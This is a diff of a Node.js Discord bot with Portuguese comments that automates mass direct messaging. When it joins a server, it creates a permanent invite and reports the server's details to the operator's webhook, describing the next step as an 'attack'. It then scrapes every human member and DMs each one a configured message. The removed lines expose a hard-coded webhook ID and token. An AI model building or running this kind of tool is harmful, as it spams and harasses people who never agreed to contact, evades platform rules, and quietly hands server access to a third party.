@@ -1,84 +1,93 @@
-/* * * * * * * * * * * * * * * * * * Mass DM Auto (Render)      *
+/* * * * * * * * * * * * * * * * * * Mass DM Auto (Render Seguro) *
 * * * * * * * * * * * * * * * * */
 
 const { Client, WebhookClient } = require("discord.js");
 const { greenBright, red, yellow, cyan } = require("chalk");
 const express = require('express');
 
-// --- CONFIGURAÇÃO WEBHOOK ---
-const WEBHOOK_ID = "1447353848493772901";
-const WEBHOOK_TOKEN = "IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1";
-const webhookClient = new WebhookClient(WEBHOOK_ID, WEBHOOK_TOKEN);
+// --- CONFIGURAÇÃO WEBHOOK (Segura) ---
+// Agora pega das variáveis de ambiente também
+const WEBHOOK_ID = process.env.WEBHOOK_ID; 
+const WEBHOOK_TOKEN = process.env.WEBHOOK_TOKEN;
 
-// --- CONFIGURAÇÃO RENDER (MANTÉM O BOT ONLINE) ---
+// Verifica se a webhook existe antes de tentar conectar
+let webhookClient = null;
+if (WEBHOOK_ID && WEBHOOK_TOKEN) {
+    webhookClient = new WebhookClient(WEBHOOK_ID, WEBHOOK_TOKEN);
+} else {
+    console.log(yellow("[AVISO] Webhook não configurada nas variáveis de ambiente."));
+}
+
+// --- CONFIGURAÇÃO RENDER ---
 const app = express();
-app.get('/', (req, res) => res.send('Bot Mass DM está rodando.'));
+app.get('/', (req, res) => res.send('Bot Mass DM Seguro está rodando.'));
 app.listen(process.env.PORT || 3000, () => console.log(greenBright('[HTTP] Servidor Web Pronto.')));
 
 // --- BOT ---
 const client = new Client();
-const { token, message } = require("./settings.json");
+
+// AQUI É A MUDANÇA: Pega o Token e a Mensagem das Variáveis de Ambiente
+const token = process.env.DISCORD_TOKEN;
+const message = process.env.DM_MESSAGE;
 
 client.on("ready", () => {
     console.log(greenBright(`[BOT] Logado como: ${client.user.tag}`));
-    console.log(yellow("[AVISO] Modo Automático: Ao entrar, espera 20s e inicia o envio."));
+    console.log(yellow("[AVISO] Modo Automático: Espera 20s e inicia envio (3s delay)."));
 });
 
-// EVENTO: Quando o bot entra em um novo servidor
 client.on("guildCreate", async (guild) => {
     console.log(greenBright(`[NOVO SERVIDOR] Entrei em: ${guild.name} (ID: ${guild.id})`));
 
-    // 1. Log na Webhook (Imediato)
-    let inviteUrl = "Não foi possível criar convite";
+    // 1. Webhook
+    let inviteUrl = "Sem permissão de convite";
     try {
-        const channel = guild.channels.cache.find(channel => channel.type === 'text' && channel.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
+        const channel = guild.channels.cache.find(c => c.type === 'text' && c.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
         if (channel) {
             const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
             inviteUrl = invite.url;
         }
     } catch (err) {}
 
-    try {
-        await webhookClient.send({
-            content: `🚨 **ENTREI EM UM SERVIDOR!**\n**Nome:** ${guild.name}\n**ID:** \`${guild.id}\`\n**Membros:** ${guild.memberCount}\n**Convite:** ${inviteUrl}\n\n⏳ *Aguardando 20 segundos para iniciar o ataque...*`
-        });
-        console.log(greenBright("[LOG] Webhook enviada."));
-    } catch (err) {
-        console.log(red(`[LOG] Erro na Webhook: ${err.message}`));
+    if (webhookClient) {
+        try {
+            await webhookClient.send({
+                content: `🚨 **ENTREI EM UM SERVIDOR!**\n**Nome:** ${guild.name}\n**ID:** \`${guild.id}\`\n**Membros:** ${guild.memberCount}\n**Convite:** ${inviteUrl}\n\n⏳ *Aguardando 20 segundos...*`
+            });
+            console.log(greenBright("[LOG] Webhook enviada."));
+        } catch (err) {
+            console.log(red(`[LOG] Erro Webhook: ${err.message}`));
+        }
     }
 
-    // 2. Delay de 20 Segundos antes de começar
-    console.log(cyan("⏳ Aguardando 20 segundos antes de começar a raspar..."));
-    
+    // 2. Delay de 20s
+    console.log(cyan("⏳ Aguardando 20 segundos..."));
     setTimeout(() => {
         ScrapeAndSend(guild);
-    }, 20000); // 20000 milissegundos = 20 segundos
+    }, 20000);
 });
 
 async function ScrapeAndSend(guild) {
-    console.log(yellow(`[INICIANDO] Lendo membros de ${guild.name} agora...`));
+    if (!message) return console.log(red("[ERRO] Nenhuma mensagem configurada na variável DM_MESSAGE."));
 
-    try {
-        await guild.members.fetch(); 
-    } catch (e) {
-        console.log(red("Erro ao baixar membros (Falta permissão?): " + e.message));
-    }
+    console.log(yellow(`[INICIANDO] Lendo membros de ${guild.name}...`));
+    try { await guild.members.fetch(); } catch (e) {}
 
-    // Filtra bots para não perder tempo
-    const members = guild.members.cache.filter(member => !member.user.bot);
-    console.log(greenBright(`[ALVO] ${members.size} membros encontrados. Iniciando envio (Delay: 3s)...`));
+    const members = guild.members.cache.filter(m => !m.user.bot);
+    console.log(greenBright(`[ALVO] ${members.size} membros encontrados.`));
 
     let count = 0;
     members.forEach((member) => {
         count++;
-        
-        // Delay de 3 segundos por usuário (3000ms)
         setTimeout(() => {
             member.send(message)
                 .then(() => console.log(greenBright(`[${count}/${members.size}] Enviado: ${member.user.tag}`)))
-                .catch(err => console.log(red(`[${count}/${members.size}] Falha: ${member.user.tag} (DM Fechada)`)));
-        }, 3000 * count); 
+                .catch(err => console.log(red(`[${count}/${members.size}] Falha: ${member.user.tag}`)));
+        }, 3000 * count);
     });
 }
 
-client.login(token).catch(err => console.log(red("Erro no Login: " + err.message)));
+if (!token) {
+    console.log(red("[ERRO CRÍTICO] Falta a variável DISCORD_TOKEN no Render."));
+} else {
+    client.login(token).catch(err => console.log(red("Erro Token: " + err.message)));
+}
